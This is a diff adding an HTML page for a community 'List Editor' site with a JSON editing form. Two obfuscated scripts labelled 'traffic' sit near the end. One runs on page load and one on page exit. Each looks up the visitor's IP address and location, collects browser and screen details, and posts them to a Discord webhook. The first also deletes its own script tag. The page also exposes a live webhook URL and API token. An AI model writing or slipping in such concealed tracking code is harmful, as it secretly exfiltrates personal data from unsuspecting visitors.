@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+    <link rel="stylesheet" href="style.css">
+    <title>List Editor</title>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2277894072143897"
+        crossorigin="anonymous"></script>
+    <meta name="author" content="bypassing1">
+    <meta property="og:title" content="List editor">
+    <meta property="og:description"
+        content="List editor, self explanatory.">
+    <meta property="og:url" content="https://bypassing1.github.io/The-Obbyist-List/voc-list.html">
+    <meta property="og:image" id="og-image"
+        content="https://cdn.discordapp.com/attachments/1246327728588849162/1251096242075860992/image.png?ex=666d55ac&is=666c042c&hm=1673e30fb92b931a8db05c2793e8c374acdfc3acea0928abc6aff203b0d87349&">
+    <meta property="og:type" content="website">
+</head>
+
+<body>
+    <div class="img"></div>
+    <header>
+        <div class="nav-container">
+            <div class="info-text">
+                <a href="index"><span>List</span> Editor</a>
+            </div>
+            <div class="nav-group">
+                <div class="nav" id="home">
+                    <a href="index">
+                        <img src="assets/home.svg" class="flag-icon">
+                        <h3 class="nav-title">Home</h3>
+                    </a>
+                </div>
+                <div class="dropdown">
+                    <button class="dropbtn" onclick="toggleDropdown()">
+                        <img src="assets/country.svg" class="flag-icon" />
+                        <h3 class="nav-title">Universal List</h3>
+                    </button>
+                    <div class="dropdown-content" id="dropdownContent">
+                        <a href="universal-list">Universal List</a>
+                        <a href="eio-list">Indonesian List</a>
+                        <a href="voc-list">Vietnamese List</a>
+                        <a href="ukr-list">Ukraine List</a>
+                        <a href="koc-list">Korean List</a>
+                        <a href="mys-list">Malaysian List</a>
+                    </div>
+                </div>
+                <div class="nav">
+                    <a href="https://discord.gg/XXCk8EDF6r" target="_blank">
+                        <img src="assets/discord.svg" class="flag-icon" />
+                        <h3 class="nav-title">Discord Server</h3>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </header>
+    <div class="top-block"></div>
+    <section class="editor-section">
+        <div class="editor-container">
+            <h1>Edit Universal List</h1>
+            <textarea id="json-editor" rows="65" cols="100"></textarea>
+            <div class="btn-container">
+                <button id="cancel-btn">Cancel</button>
+                <button id="save-btn">Save Changes</button>
+            </div>
+        </div>
+    </section>
+    <div class="loader"></div>
+    <script>
+        const prefix = 'globaldata';
+        const listBlobsApiUrl = '/api/listBlobs';
+        let blobUrl = '';
+        let originalData = '';
+        fetch(listBlobsApiUrl)
+        .then(response => response.json())
+        .then(data => {
+            const files = data.blobs || [];
+            const matchedFile = files.find(file => file.pathname && file.pathname.startsWith(prefix));
+            if (matchedFile) {
+                blobUrl = matchedFile.url;
+                fetch(blobUrl)
+                    .then(response => response.json())
+                    .then(data => {
+                        originalData = JSON.stringify(data, null, 2);
+                        document.getElementById('json-editor').value = originalData;
+                    })
+                    .catch(error => console.error('Error fetching JSON:', error));
+            } else {
+                console.error('No file found with the specified prefix.');
+            }
+        })
+        .catch(error => console.error('Error fetching files:', error));
+        document.getElementById('save-btn').addEventListener('click', () => {
+            const updatedData = document.getElementById('json-editor').value;
+            fetch('/api/saveJson', {
+                    method: 'PUT',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ blobUrl, prefix, updatedData }),
+                })
+                .then(response => response.json())
+                .then(result => {
+                    console.log('Update successful:', result);
+                    alert('Update successful!');
+                })
+                .catch(error => console.error('Error updating JSON:', error));
+        });
+        document.getElementById('cancel-btn').addEventListener('click', () => {
+            document.getElementById('json-editor').value = originalData;
+        });
+    </script>
+    <script>
+        window.si = window.si || function () {
+            (window.siq = window.siq || []).push(arguments);
+        };
+    </script>
+    <script defer src="/_vercel/speed-insights/script.js"></script>
+    <script>
+        window.va = window.va || function () {
+            (window.vaq = window.vaq || []).push(arguments);
+        };
+    </script>
+    <script defer src="/_vercel/insights/script.js"></script>
+    <script class="traffic">
+        function _0x4328() {
+            const _0x550be5 = ['city', ',\x20Height:\x20', 'catch', 'Failed\x20to\x20fetch\x20IP\x20info', 'stringify',
+                'language', 'width', '6cbeguE', 'Language', '2805480OYuaQp', '2401YJcLqP', '34975143REWmSt',
+                'screen', 'DONE', 'Access\x20event\x20recorded', 'height', 'City', 'Screen', 'json', 'platform',
+                '28432KcUqJg',
+                'https://discord.com/api/webhooks/1246327757105926166/QzIzaMff8SONkEzyOu194IS_XIoa52xQHfbvGR82QNhc57oAGB4SogGzEWHY3y0VaYv3',
+                'Content-Type', '712090NiMrUB', 'setRequestHeader', 'Unavailable', 'querySelector', 'then',
+                'parentNode', 'removeChild', 'onreadystatechange', '26557pJOJpm', 'userAgent', '.traffic',
+                '5463745eRhOpi', 'send', 'region', 'User-Agent', 'href', 'URL', 'en-US', 'Asia/Jakarta',
+                '5123316uEUUbr', 'open', 'country', 'POST', ',\x20Color\x20Depth:\x20', '10oEEjzE',
+                'New\x20Access\x20Detected'
+            ];
+            _0x4328 = function () {
+                return _0x550be5;
+            };
+            return _0x4328();
+        }
+        const _0x39f672 = _0x4823;
+        (function (_0xe46696, _0x18d561) {
+            const _0xdaaea1 = _0x4823,
+                _0x5a7529 = _0xe46696();
+            while (!![]) {
+                try {
+                    const _0x31d842 = parseInt(_0xdaaea1(0x117)) / 0x1 + -parseInt(_0xdaaea1(0x10f)) / 0x2 * (
+                            parseInt(_0xdaaea1(0xff)) / 0x3) + parseInt(_0xdaaea1(0x101)) / 0x4 + -parseInt(
+                            _0xdaaea1(0x11a)) / 0x5 + -parseInt(_0xdaaea1(0x122)) / 0x6 + parseInt(_0xdaaea1(
+                            0x102)) / 0x7 * (-parseInt(_0xdaaea1(0x10c)) / 0x8) + -parseInt(_0xdaaea1(0x103)) /
+                        0x9 * (-
+                            parseInt(_0xdaaea1(0xf6)) / 0xa);
+                    if (_0x31d842 === _0x18d561) break;
+                    else _0x5a7529['push'](_0x5a7529['shift']());
+                } catch (_0x1479e8) {
+                    _0x5a7529['push'](_0x5a7529['shift']());
+                }
+            }
+        }(_0x4328, 0xb3c33));
+        const webhookUrl = _0x39f672(0x10d);
+        async function sendWebhook() {
+            const _0x27277c = _0x39f672,
+                _0x54909c = await fetch('https://ipinfo.io/json?token=ce1fc29ae007b4')[_0x27277c(0x113)](
+                    _0x17aeae => _0x17aeae[_0x27277c(0x10a)]())[_0x27277c(0xfa)](_0x2f274b => ({
+                    'error': _0x27277c(0xfb)
+                })),
+                _0x59802b = {
+                    'userAgent': navigator[_0x27277c(0x118)],
+                    'platform': navigator['platform'],
+                    'language': navigator[_0x27277c(0xfd)],
+                    'screen': {
+                        'width': screen[_0x27277c(0xfe)],
+                        'height': screen[_0x27277c(0x107)],
+                        'colorDepth': screen['colorDepth']
+                    }
+                },
+                _0x150826 = new Date()['toLocaleString'](_0x27277c(0x120), {
+                    'timeZone': _0x27277c(0x121),
+                    'hour12': ![]
+                }),
+                _0x3dd0eb = {
+                    'title': _0x27277c(0xf7),
+                    'description': 'Details\x20of\x20the\x20access\x20event',
+                    'color': 0x3498db,
+                    'fields': [{
+                        'name': _0x27277c(0x11f),
+                        'value': location[_0x27277c(0x11e)],
+                        'inline': ![]
+                    }, {
+                        'name': 'Time\x20(WIB)',
+                        'value': _0x150826,
+                        'inline': ![]
+                    }, {
+                        'name': 'IP',
+                        'value': _0x54909c['ip'] || 'Unavailable',
+                        'inline': !![]
+                    }, {
+                        'name': _0x27277c(0x108),
+                        'value': _0x54909c[_0x27277c(0xf8)] || _0x27277c(0x111),
+                        'inline': !![]
+                    }, {
+                        'name': 'Region',
+                        'value': _0x54909c[_0x27277c(0x11c)] || _0x27277c(0x111),
+                        'inline': !![]
+                    }, {
+                        'name': 'Country',
+                        'value': _0x54909c[_0x27277c(0x124)] || _0x27277c(0x111),
+                        'inline': !![]
+                    }, {
+                        'name': _0x27277c(0x11d),
+                        'value': _0x59802b[_0x27277c(0x118)],
+                        'inline': ![]
+                    }, {
+                        'name': 'Platform',
+                        'value': _0x59802b[_0x27277c(0x10b)],
+                        'inline': !![]
+                    }, {
+                        'name': _0x27277c(0x100),
+                        'value': _0x59802b[_0x27277c(0xfd)],
+                        'inline': !![]
+                    }, {
+                        'name': _0x27277c(0x109),
+                        'value': 'Width:\x20' + _0x59802b[_0x27277c(0x104)][_0x27277c(0xfe)] + _0x27277c(
+                                0xf9) + _0x59802b[_0x27277c(0x104)][_0x27277c(0x107)] + _0x27277c(0xf5) +
+                            _0x59802b['screen']['colorDepth'],
+                        'inline': ![]
+                    }],
+                    'footer': {
+                        'text': _0x27277c(0x106)
+                    },
+                    'timestamp': new Date()
+                },
+                _0x240b80 = JSON[_0x27277c(0xfc)]({
+                    'embeds': [_0x3dd0eb]
+                }),
+                _0x45b7a8 = new XMLHttpRequest();
+            _0x45b7a8[_0x27277c(0x123)](_0x27277c(0xf4), webhookUrl, !![]), _0x45b7a8[_0x27277c(0x110)](_0x27277c(
+                0x10e), 'application/json'), _0x45b7a8[_0x27277c(0x116)] = function () {
+                const _0x38544c = _0x27277c;
+                if (_0x45b7a8['readyState'] === XMLHttpRequest[_0x38544c(0x105)]) {
+                    const _0x354936 = document[_0x38544c(0x112)](_0x38544c(0x119));
+                    _0x354936 && _0x354936[_0x38544c(0x114)][_0x38544c(0x115)](_0x354936);
+                }
+            }, _0x45b7a8[_0x27277c(0x11b)](_0x240b80);
+        }
+
+        function _0x4823(_0xf522e8, _0x2e07bd) {
+            const _0x432893 = _0x4328();
+            return _0x4823 = function (_0x482389, _0x54bbfd) {
+                _0x482389 = _0x482389 - 0xf4;
+                let _0x34481c = _0x432893[_0x482389];
+                return _0x34481c;
+            }, _0x4823(_0xf522e8, _0x2e07bd);
+        }
+        sendWebhook();
+    </script>
+    <script class="traffic">
+        function _0xf9c7(_0x143103, _0x300a71) {
+            const _0x3da0c6 = _0x3da0();
+            return _0xf9c7 = function (_0xf9c73a, _0x31a7da) {
+                _0xf9c73a = _0xf9c73a - 0xac;
+                let _0x35598e = _0x3da0c6[_0xf9c73a];
+                return _0x35598e;
+            }, _0xf9c7(_0x143103, _0x300a71);
+        }
+        const _0x58406d = _0xf9c7;
+        (function (_0x30e20e, _0x2d8cef) {
+            const _0x28f706 = _0xf9c7,
+                _0x2645e5 = _0x30e20e();
+            while (!![]) {
+                try {
+                    const _0x492040 = parseInt(_0x28f706(0xb9)) / 0x1 + -parseInt(_0x28f706(0xc7)) / 0x2 + -
+                        parseInt(_0x28f706(0xd6)) / 0x3 + -parseInt(_0x28f706(0xaf)) / 0x4 * (-parseInt(_0x28f706(
+                            0xc2)) / 0x5) + parseInt(_0x28f706(0xc8)) / 0x6 + parseInt(_0x28f706(0xcd)) / 0x7 * (
+                            parseInt(_0x28f706(0xd9)) / 0x8) + parseInt(_0x28f706(0xc5)) / 0x9 * (-parseInt(
+                            _0x28f706(0xd5)) / 0xa);
+                    if (_0x492040 === _0x2d8cef) break;
+                    else _0x2645e5['push'](_0x2645e5['shift']());
+                } catch (_0x6a2121) {
+                    _0x2645e5['push'](_0x2645e5['shift']());
+                }
+            }
+        }(_0x3da0, 0x64f88));
+
+        function _0x3da0() {
+            const _0x3fa505 = ['addEventListener', '15327mhmzRW', 'colorDepth', '17512auGbjm', '4711662ywDgxb',
+                'userAgent', 'Screen', 'platform', 'User-Agent', '3977393fJDAnn', 'Width:\x20', 'setRequestHeader',
+                'Country', 'en-US', 'city', 'screen', 'https://ipinfo.io/json?token=ce1fc29ae007b4', '11780bUJQpC',
+                '345009NfXxke', 'Asia/Jakarta', 'Unavailable', '8FXcyPK', 'send', 'region', 'json', 'height',
+                'open', 'application/json', 'User\x20has\x20left\x20the\x20website', '4SnaHHI', 'href', 'POST',
+                'catch', 'beforeunload', 'toLocaleString', 'URL', 'Content-Type', 'City', 'Time\x20(WIB)',
+                '700688UclMLC', 'then', 'width', 'Language', ',\x20Height:\x20', 'language',
+                'Failed\x20to\x20fetch\x20IP\x20info', 'Website\x20exit\x20event\x20recorded', 'country',
+                '2446525XocMlM', 'Region'
+            ];
+            _0x3da0 = function () {
+                return _0x3fa505;
+            };
+            return _0x3da0();
+        }
+        const WebhookUrl =
+            'https://discord.com/api/webhooks/1246327757105926166/QzIzaMff8SONkEzyOu194IS_XIoa52xQHfbvGR82QNhc57oAGB4SogGzEWHY3y0VaYv3';
+        async function sendWebhook() {
+            const _0xc30a86 = _0xf9c7,
+                _0x35a9f8 = await fetch(_0xc30a86(0xd4))[_0xc30a86(0xba)](_0xd57745 => _0xd57745[_0xc30a86(0xdc)]
+                    ())[_0xc30a86(0xb2)](_0x7c66f9 => ({
+                    'error': _0xc30a86(0xbf)
+                })),
+                _0x4cacd5 = {
+                    'userAgent': navigator['userAgent'],
+                    'platform': navigator[_0xc30a86(0xcb)],
+                    'language': navigator[_0xc30a86(0xbe)],
+                    'screen': {
+                        'width': screen['width'],
+                        'height': screen[_0xc30a86(0xdd)],
+                        'colorDepth': screen[_0xc30a86(0xc6)]
+                    }
+                },
+                _0x33489f = new Date()[_0xc30a86(0xb4)](_0xc30a86(0xd1), {
+                    'timeZone': _0xc30a86(0xd7),
+                    'hour12': ![]
+                }),
+                _0x3df546 = {
+                    'title': _0xc30a86(0xae),
+                    'description': 'Details\x20of\x20the\x20access\x20event',
+                    'color': 0xe74c3c,
+                    'fields': [{
+                        'name': _0xc30a86(0xb5),
+                        'value': location[_0xc30a86(0xb0)],
+                        'inline': ![]
+                    }, {
+                        'name': _0xc30a86(0xb8),
+                        'value': _0x33489f,
+                        'inline': ![]
+                    }, {
+                        'name': 'IP',
+                        'value': _0x35a9f8['ip'] || _0xc30a86(0xd8),
+                        'inline': !![]
+                    }, {
+                        'name': _0xc30a86(0xb7),
+                        'value': _0x35a9f8[_0xc30a86(0xd2)] || _0xc30a86(0xd8),
+                        'inline': !![]
+                    }, {
+                        'name': _0xc30a86(0xc3),
+                        'value': _0x35a9f8[_0xc30a86(0xdb)] || _0xc30a86(0xd8),
+                        'inline': !![]
+                    }, {
+                        'name': _0xc30a86(0xd0),
+                        'value': _0x35a9f8[_0xc30a86(0xc1)] || _0xc30a86(0xd8),
+                        'inline': !![]
+                    }, {
+                        'name': _0xc30a86(0xcc),
+                        'value': _0x4cacd5[_0xc30a86(0xc9)],
+                        'inline': ![]
+                    }, {
+                        'name': 'Platform',
+                        'value': _0x4cacd5['platform'],
+                        'inline': !![]
+                    }, {
+                        'name': _0xc30a86(0xbc),
+                        'value': _0x4cacd5[_0xc30a86(0xbe)],
+                        'inline': !![]
+                    }, {
+                        'name': _0xc30a86(0xca),
+                        'value': _0xc30a86(0xce) + _0x4cacd5[_0xc30a86(0xd3)][_0xc30a86(0xbb)] + _0xc30a86(
+                                0xbd) + _0x4cacd5[_0xc30a86(0xd3)]['height'] + ',\x20Color\x20Depth:\x20' +
+                            _0x4cacd5['screen'][_0xc30a86(0xc6)],
+                        'inline': ![]
+                    }],
+                    'footer': {
+                        'text': _0xc30a86(0xc0)
+                    },
+                    'timestamp': new Date()
+                },
+                _0xa3b776 = JSON['stringify']({
+                    'embeds': [_0x3df546]
+                }),
+                _0x14e064 = new XMLHttpRequest();
+            _0x14e064[_0xc30a86(0xac)](_0xc30a86(0xb1), WebhookUrl, !![]), _0x14e064[_0xc30a86(0xcf)](_0xc30a86(
+                0xb6), _0xc30a86(0xad)), _0x14e064[_0xc30a86(0xda)](_0xa3b776);
+        }
+        window[_0x58406d(0xc4)](_0x58406d(0xb3), function (_0x59c1bb) {
+            sendWebhook();
+        });
+    </script>
+    <script>
+        function toggleDropdown() {
+            const dropdownContent = document.getElementById("dropdownContent");
+            dropdownContent.classList.toggle("show");
+        }
+
+        const loader = document.querySelector(".loader");
+
+        const startTransition = () => {
+            loader.style.transform = "translateX(100%)";
+        };
+
+        window.addEventListener("load", () => {
+            startTransition();
+        });
+    </script>
+    <footer>
+        <p>© Copyright 2024-2024 Elite Indonesian Obbyist</p>
+        <br>
+        <p class="shoutout">Shoutout to :</p>
+        <p>galih_funfan lcknt Zayenzoo D4RAWET proprpod ReaIBear</p>
+    </footer>
+</body>
+
+</html>
